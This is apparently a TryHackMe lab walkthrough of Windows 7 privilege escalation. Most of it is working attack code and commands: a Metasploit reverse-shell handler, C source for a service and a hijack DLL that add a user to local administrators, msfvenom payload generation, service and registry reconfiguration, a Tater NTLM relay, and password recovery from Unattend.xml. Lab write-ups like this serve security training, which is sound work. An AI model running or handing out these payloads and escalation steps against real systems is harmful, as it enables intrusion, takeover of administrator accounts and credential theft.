# Walkthrough : TryHackMe - Windows Privilege Arena
Target Host: ```TCM-PC (10.49.178.170)```
OS Version: Windows 7 (Build 7601)
Attacker IP: ```192.168.135.130```

## 1. Initial Access & Handler Setup
- Payload Handler: Configured Metasploit handler for incoming connections.
```bash
msf > use multi/handler
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 192.168.135.130
msf exploit(multi/handler) > run
```
- Session Verification: Established initial Meterpreter session and dropped to interactive shell.
```bash
meterpreter > getuid
Server username: TCM-PC\TCM
meterpreter > shell
C:\Windows\system32> whoami
tcm-pc\tcm
```
## 2. Exploitation Vectors & Escalation Paths
Vector 1: Windows Service Executable Creation & Compilation
- Payload Construction (```windows_service.c```): Custom C service designed to add ```user``` to local administrators upon execution.
```bash
#include <windows.h>
#include <stdio.h>

// Custom service execution logic calling:
system("cmd.exe /k net localgroup administrators user /add");
```
- Compilation Command:
```bash
x86_64-w64-mingw32-gcc windows_service.c -o x.exe
```
Vector 2: Registry Service Binary Path Modification (regsvc)
- Payload Delivery: Staged x.exe via ```python3 -m http.server 8080``` and fetched to ```C:\Temp\x.exe```.
- Execution Commands:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
sc start regsvc
```
- Verification: ```net localgroup administrators``` confirmed ```user``` addition under SYSTEM context.

Vector 3: Weak Service File Permissions (```filepermsvc```)
- Permission Enumeration:
```bash
accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
```
Result: Identified ```Everyone``` has ```FILE_ALL_ACCESS``` permissions over ```filepermservice.exe```.
- Exploitation:
```bash
copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
sc start filepermsvc
```
Vector 4: Weak Directory Permissions (Startup Folder)
- Permission Enumeration:
```bash
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```
Result: Confirmed ```BUILTIN\Users:(F)``` (Full Control), allowing persistent binary execution during administrative logons.

Vector 5: RDP Session & Remote Tooling
- Connection Command:
```bash
xfreerdp /u:TCM /p:Hacker123 /v:10.49.178.170 /sec:rdp /cert:ignore
```
- Dedicated desktop GUI environment used to launch post-exploitation tools (winPEAS64.exe, Procmon64.exe).

Vector 6: DLL Hijacking (dllhijackservice.exe)
- Target Identification: Analyzed process execution using ```Procmon64.exe``` to isolate missing DLL dependencies (```NAME NOT FOUND events```).
- Malicious DLL Source (```windows_dll.c```):
```bash
#include <windows.h>

BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```
- Compilation & Deployment:
```bash
x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
```
Downloaded to ```C:\Temp\hijackme.dll``` and triggered via service restart (```sc stop dllsvc & sc start dllsvc```).

Vector 7: Service DACL Misconfiguration (```daclsvc```)
- Permission Enumeration: ```accesschk64.exe -wuvc daclsvc``` revealed Everyone group possesses ```SERVICE_CHANGE_CONFIG``` privileges.
- Execution:
```bash
sc config daclsvc binpath= "net localgroup administrators user /add"
sc start daclsvc
```
Vector 8: Unquoted Service Path (unquotedsvc)
- Configuration Inspection: sc qc unquotedsvc returned unquoted binary path with spaces:
- C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
- Payload Generation & Placement: Generated common.exe via msfvenom and transferred it to C:\Program Files\Unquoted Path Service\common.exe.
```bash
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
```
- Execution: Executed ```sc start unquotedsvc``` to force Windows path-parsing execution of ```common.exe```.

Vector 9: Local Authentication Relay (Hot Potato / Tater)
- Environment Setup: ```powershell.exe -nop -ep bypass```
- Execution Command:
```bash
Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1
Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
```
- Execution Mechanism: Spoofed NBNS for WPAD requests, intercepted Windows Defender updates to capture ```LocalSystem``` HTTP authentication, and relayed credentials to SMB for privilege escalation.

Vector 10: Unattended Installation File Credential Harvesting
- File Inspection: Checked ```C:\Windows\Panther\Unattend.xml``` for stored administrative installation defaults.
- Extracted Blob:
```bash
<AutoLogon>
    <Password>
        <Value>cGFzc3dvcmQxMjM=</Value>
        <PlainText>false</PlainText>
    </Password>
    <Username>Admin</Username>
</AutoLogon>
```
- Credential Decoding:
```bash
echo 'cGFzc3dvcmQxMjM=' | base64 --decode
# Output: password123
```
## 3. Summary of Discovered Credentials & Access Level

| Account / Context   | Credential / Privilege Level   | Source Vector                                |
|:--                  |:--                             |:--                                           | 
| TCM                 | Hacker123                      | RDP / Initial Shell                          | 
| user                | Added to Administrators        | "Service DACL, DLL Hijacking, Service Paths" | 
| Admin               | password123                    | Unattended Setup XML (Unattend.xml)          | 
